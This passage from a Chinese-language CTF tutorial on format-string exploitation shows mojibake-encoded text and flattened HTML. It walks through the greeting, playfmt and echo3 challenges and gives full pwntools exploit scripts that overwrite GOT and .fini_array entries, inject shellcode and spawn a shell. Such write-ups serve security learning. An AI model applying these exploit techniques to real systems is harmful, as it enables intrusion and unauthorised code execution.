¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»¥åå°±ç»“æŸäº†ï¼Œæ²¡æœ‰åœ¨è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•åˆ©ç”¨GOTåŠ«æŒæˆ–è€…ä¿®æ”¹ret addrã€‚<br>å†çœ‹ä¸‹getnlineå‡½æ•°ï¼š</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>å‘ç°æœ‰äº†strlençš„å‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¹Ÿæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚<br>è¿™å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼Œåœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´æ—¶ï¼š</p><ul><li>ä¿®æ”¹<code>.fini_array</code>åŒºçš„ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåœ°å€ä¸ºstartï¼Œè®©å…¶é‡å¯è·‘ä¸€æ¬¡ç¨‹åº</li><li>å› ä¸ºçŸ¥é“è‚¯å®šä¼šè·‘åˆ°strlené‚£é‡Œï¼Œæ‰€ä»¥åœ¨åŠ«æŒstrlençš„GOTä¸ºsystem</li><li>å¾…ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œå°±åœ¨ä¼ é€ä¸€ä¸ª<code>/bin/sh</code>å³å¯</li></ul><p>æ³¨æ„çš„æ˜¯,è¿™ä¸ª<code>.fini_array</code>åŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹,ä¸”ç¨‹åºå¯è¯»å–çš„å­—èŠ‚æ•°æœ‰é™,å› æ­¤éœ€è¦åŒæ—¶ä¿®æ”¹ä¸¤ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œè¿™ä¸ªé¢˜å¹¶ä¸”éœ€è¦åˆç†è°ƒæ•´payloadã€‚</p><h5 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªé¢˜ç›®å› ä¸ºå‰é¢æœ‰</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>æ‰€ä»¥å…¶æ ˆä¸Šä¼šæ”¾ä¸Š<code>Nice to meet you,</code>çš„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„å¯¹é½ã€‚å¯¹é½åå‘ç°åç§»ä¸º12ï¼Œåœ¨å†™payloadçš„æ—¶å€™å¯ä»¥ä½¿ç”¨å•æ¬¡printfå¤šæ¬¡å†™å…¥çš„è„šæœ¬ï¼Œæ‰€ä»¥æ¥<code>().ljust(0x32,&#39;a&#39;)</code> ,æ‰€ä»¥åç§»éœ€è¦åŠ ä¸Š<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #æ³¨æ„è¿™ä¸ªé¢˜åœ¨å¯æ§æ ¼å¼åŒ–å­—ç¬¦ä¸²å‰æœ‰å­—ç¬¦è¾“å‡ºpayload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h3><h4 id="ç»•è¿‡canary"><a href="#ç»•è¿‡canary" class="headerlink" title="ç»•è¿‡canary"></a>ç»•è¿‡canary</h4><p>å¯ä»¥åˆ©ç”¨fmtæ¼æ´ï¼Œä»»æ„è¯»çš„ç‰¹æ€§ï¼Œåœ¨æœ‰canaryçš„ç¨‹åºä¸­ï¼Œç®—å¥½åç§»ä»¥åè¯»å‡ºcanaryå­˜çš„æ£€éªŒå€¼ï¼ˆåŸºæœ¬éƒ½æ˜¯ä»¥00ç»“å°¾æ¯”è¾ƒå¥½æ‰¾ï¼‰ï¼Œç„¶ååœ¨buffer overflow æ—¶ï¼Œåœ¨å¯¹åº”ä½ç½®å¡«ä¸Šcanaryæ£€éªŒå€¼ï¼Œå³å¯ç»•è¿‡canaryã€‚</p><h4 id="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"><a href="#printfå®¶æ—çš„å…¶ä»–å‡½æ•°" class="headerlink" title="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"></a>printfå®¶æ—çš„å…¶ä»–å‡½æ•°</h4><p>é¦–å…ˆè¦è®°å¾—ä¸€ç‚¹å‡½æ•°å‚æ•°çš„å…¥æ ˆé¡ºåºï¼Œå¤§å¤šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å…¥æ ˆï¼Œåœ¨é‡åˆ°å…¶ä»–çš„printfç±»å‡½æ•°ï¼Œåœ¨ç¡®å®šåç§»æ—¶ï¼Œä¸€å®šè¦è¦æŠŠæ¡fmtæ˜¯åœ¨æ ˆä¸Šçš„é‚£ä¸ªä½ç½®ï¼Œç„¶åè¿›è¡Œè®¡ç®—åç§»ï¼ˆä¸èƒ½ç®€å•çš„åˆ©ç”¨pwndbgçš„fmtargäº†ï¼‰ã€‚</p><ul><li>fprintfï¼šåŸºæœ¬ä¸Šä¸€æ ·ï¼Œåªæ˜¯format string ä¸åœ¨ç¬¬ä¸€å‚æ•°ï¼Œä½¿å¾—overwrite function table æ—¶å¾ˆéš¾ä½¿ç”¨</li><li>sprintfï¼šå¯ä»¥ç”¨%xxc æ¥é€ æˆæ–°çš„buffer overflow </li></ul><h4 id="åŠ«æŒ-stack-chk-fail"><a href="#åŠ«æŒ-stack-chk-fail" class="headerlink" title="åŠ«æŒ__stack_chk_fail"></a>åŠ«æŒ<code>__stack_chk_fail</code></h4><ul><li>åœ¨æ— æ³• stack overflow ä¹Ÿæ²¡æœ‰å…¶å®ƒå‡½æ•°å¯ä»¥åŠ«æŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¿®æ”¹<code>__stack_chk_fail</code> çš„ G0T å¹¶ä¸”ç ´å canary ä½¿è¿™ä¸ªå‡½æ•°è¢«callï¼Œç„¶åjmpæƒ³è¦çš„ç›®æ ‡åœ°å€</li><li>åœ¨åªæœ‰ä¸€æ¬¡ stack overflow+fmt æ—¶å¯ä»¥å°†<code>__stack_chk_fail</code>æ”¹æˆç›´æ¥ret ï¼Œè¿™æ ·stack overflow æ—¶å¯ä»¥æ— è§†canary ï¼Œä¹Ÿå¯ä»¥æ”¾ä¸ŠROPé“¾ï¼Œè¿›è€Œè¿›å…¥ä¹‹åçš„ROPã€‚</li></ul><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š</h2><p>æœ‰æ—¶å€™å¹¶ä¸ä¼šè¿™ä¹ˆåˆšå¥½ format string çš„ buf åœ¨æ ˆä¸Šå½“å…¶åœ¨ data, bss æˆ–æ˜¯ heap ä¸Šçš„æƒ…å†µï¼Œæ— æ³•åœ¨ stack ä¸­æ”¾ä¸Šä¸€ä¸ª address ç»™ä»»æ„è¯»å†™çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åœ¨  stack ä¸Šç°æœ‰çš„ pointer è¿›è¡Œå†™å€¼ã€‚å…¶ä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯æ ˆä¸Šç°æœ‰çš„EBPé“¾ã€‚</p><h3 id="EBPé“¾"><a href="#EBPé“¾" class="headerlink" title="EBPé“¾"></a>EBPé“¾</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>æ­£å¦‚è¿™ä¸ªå›¾ï¼Œå½“ä¸€ä¸ªç¨‹åºå®Œæˆäº†ç”±mainâ€”&gt;Aâ€”&gt;Bçš„å‡½æ•°è°ƒç”¨ï¼Œæ ˆä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªEBPé“¾ï¼Œåƒå›¾ä¸­çš„ebp3(B)â€”&gt;ebp2(A)â€”&gt;ebp1(main)ï¼Œç„¶å</p><ul><li>é€šè¿‡æ‰¾å‡†offset1(ç®—ä¸€ä¸‹ebp3ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å¯¹EBP2ä½¿ç”¨%hhnï¼Œå°±å¯ä»¥ä¿®æ”¹åˆ°EBP1çš„æœ€ä½ä½ï¼Œä½¿å¾—EBP1åœ¨ä¸€ä¸ª256çš„èŒƒå›´å†…è¿›è¡Œå˜åŒ–ï¼Œå¯ä»¥æ”¹æˆä½ æƒ³è¦ä¿®æ”¹çš„æ ˆå†…å­˜å•å…ƒæŒ‡é’ˆï¼ˆæ¯”å¦‚ret addressçš„æ ˆæŒ‡é’ˆï¼‰ã€‚</li><li>æ”¹å†™å¥½EBP1åï¼Œæ‰¾å‡†offset2 (ç®—ä¸€ä¸‹EBP2ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å†å¯¹EBP1ä½¿ç”¨%hhnæˆ–è€…%hnï¼Œå³å¯å®Œæˆå¯¹ä½ æƒ³è¦ä¿®æ”¹çš„åœ°å€çš„å†™å€¼ã€‚</li></ul><p>ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªæ”»å‡»è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨æ¼æ´æ˜¯æ„é€ å‡ºæˆ‘ä»¬è¦è¯»å†™çš„åœ°å€ï¼Œå†ä¸€æ¬¡åˆ™æ˜¯å¯¹å‰é¢æ„é€ å‡ºæ¥çš„åœ°å€è¿›è¡Œä»»æ„è¯»å†™ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ä¸€å®šè¦å­¦ä¼šå¯¹æ ˆä¸Šçš„å·²æœ‰æ•°æ®çš„çµæ´»çš„è¿ç”¨</strong>ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªé¢˜æ¥ä»”ç»†åˆ†æä¸€ä¸‹</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h5 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>å…¶ä¸­çœ‹åˆ°bufåœ¨bssæ®µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>è¿™å°±æ˜¯ä¸åœ¨æ ˆä¸Šï¼Œä¸èƒ½è·Ÿå‰é¢çš„é¢˜ç›®ä¸€æ ·ï¼Œç›´æ¥åœ¨æ ˆä¸Šå†™ä¸Šåœ°å€ï¼Œç„¶åæ¥å®Œæˆæ”»å‡»ã€‚</p><p>ä¸Šå±‚æœ‰main å’Œplayå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œä¸”åœ¨ç¬¬ä¸‰å±‚çš„do-fmtå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥å®Œæˆæ”»å‡»ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œå¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ä¿®æ”¹æŸä¸ªå‡½æ•°è¿”å›åœ°å€ï¼Œç„¶åæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h5 id="gdbè°ƒè¯•-2"><a href="#gdbè°ƒè¯•-2" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p>å®šä½åˆ°printfå‡½æ•°å¤„ï¼š</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>espå¯„å­˜å™¨ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æŠŠ<code>0xffffd338</code>å«åšebp3ï¼Œ<code>0xffffd348</code>ä¸ºebp2ï¼Œ<code>0xffffd358</code>ä¸ºebp1ã€‚</p><p>ç¬¬ä¸€æ¬¡ä¿®æ”¹ï¼šå¯¹ebp2ä½¿ç”¨<code>%xxhhn</code>ä¿®æ”¹ebp1ä¸ºdo-fmtå‡½æ•°çš„retaddr <code>0xffffd33c</code>çš„<strong>æ ˆæŒ‡é’ˆ</strong>ï¼ˆè¿™ä¸ªæ ˆæŒ‡é’ˆå¯ä»¥é€šè¿‡leakä¸€ä¸ªæ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºæ¥ï¼‰</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>ç¬¬äºŒæ¬¡ä¿®æ”¹ ï¼š å¯¹ebp1ä½¿ç”¨<code>%xxhn</code> ä¿®æ”¹retaddr <code>0x80485ad</code> ä¸ºä½ åœ¨bufå¤„æå‰æ‘†ä¸Šçš„shellcode</p><p>è¿™æ ·ç¨‹åºåœ¨é€€å‡ºè¿™ä¸ªdo-fmtå‡½æ•°å°±ä¼šjmpåˆ°shellcodeä¸Šï¼Œè¿™æ ·å°±æ‹¿åˆ°shelläº†ã€‚</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¾ˆå•çº¯çš„ç›´æ¥åˆ©ç”¨ebpé“¾è¿›è¡Œæ”»å‡»å³å¯ã€‚</p><p>ç„¶åå†çœ‹ä¸€ä¸ªæœ‰ç‚¹ä¸ä¸€æ ·çš„é¢˜ç›®ï¼š</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸€å¤„ä¼šè®©æ ˆç»“æ„çš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>è¿™ä¸€å¤„å­˜åœ¨fmtæ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ•´ä¸ªç¨‹åºæ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆåé—¨å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯ï¼š<strong>æ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚</strong><br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯æ ˆçš„éšæœºåŒ–ï¼Œè¿˜æœ‰å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©è¿™ä¸ªé¢˜ç›®ä¸æ˜¯å¾ˆå®¹æ˜“åšï¼‰</p><h4 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h4><p>å®šä½åˆ°æ¼æ´printfå‡½æ•°å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>ä¼šå‘ç°è¿™ä¸ªæƒ…å†µæ˜¯æ²¡æœ‰<strong>æ„æˆebpé“¾</strong>çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å’±ä»¬è‡ªå·±æ¥ä»”ç»†è§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œç„¶åæ¥æŒ‘é€‰åˆé€‚çš„æ ˆæ•°æ®æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´æ¥è¿›è¡Œåˆ†æï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡ä»”ç»†åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„got+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€<br>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚</li></ul><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªçº¢æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠå‰äºŒä¸ªçº¢æ¡†<strong>è™½ä¸æ˜¯ebp</strong>çš„é“¾ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯<strong>æˆä¸€ä¸ªé“¾</strong>å¯ä»¥åˆ©ç”¨äº†ã€‚ç„¶åå¯ä»¥æŠŠç¬¬äºŒä¸ªçº¢æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªçº¢æ¡†çš„ä¸¤ä¸ªæ ˆæŒ‡é’ˆï¼š</p><p>è¿™é‡Œå¯ä»¥ç”¨gdbç›´æ¥æ¥æ‰‹åŠ¨è®¾ç½®ï¼Œè®©å’±ä»¬ä¸Šæ¥å°±å†™expè°ƒè¯•è¿˜æ˜¯æŒºè´¹åŠ²çš„ï¼š</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸ªè¿‡ç¨‹ä¸­åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€å’Œgot+2åœ°å€ï¼š</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥åˆ©ç”¨å¯¹gotåœ°å€å’Œgot+2åœ°å€ä½¿ç”¨<code>%xhn</code>,å†™systemçš„å†…å­˜åœ°å€ä¸Šprintfçš„gotäº†ï¼š</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>å†™å¥½ä»¥åï¼Œå†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ 